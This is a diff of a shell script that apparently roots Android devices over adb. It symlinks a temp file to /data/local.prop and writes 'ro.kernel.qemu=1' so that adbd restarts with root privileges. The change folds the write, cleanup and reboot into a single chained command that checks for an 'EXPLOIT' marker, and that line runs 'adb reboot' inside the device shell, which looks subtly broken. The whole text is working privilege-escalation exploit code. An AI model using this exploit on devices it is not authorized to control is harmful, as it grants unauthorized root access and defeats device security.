@@ -11,14 +11,14 @@ adb shell "rm /data/local/tmp/profile_calib_m"
 adb shell "ln -s /data/local.prop /data/local/tmp/profile_calib_m"
 adb reboot
 adb wait-for-device
-adb shell "echo 'ro.kernel.qemu=1' > /data/local.prop"
-adb shell "rm /data/local/tmp/profile_calib_m"
-adb reboot
-adb wait-for-device
-# now adbd runs as root due to ro.kernel.qemu=1
+adb shell "echo 'ro.kernel.qemu=1' > /data/local.prop && echo EXPLOIT; rm /data/local/tmp/profile_calib_m; adb reboot" | tee /dev/stderr | grep EXPLOIT &&
+{
+	adb wait-for-device
+	# now adbd runs as root due to ro.kernel.qemu=1
 
-# to lose root on reboot
-adb shell "rm /data/local.prop"
+	# to lose root on reboot
+	adb shell "rm /data/local.prop"
+}
 
 haveroot || exit 1
 
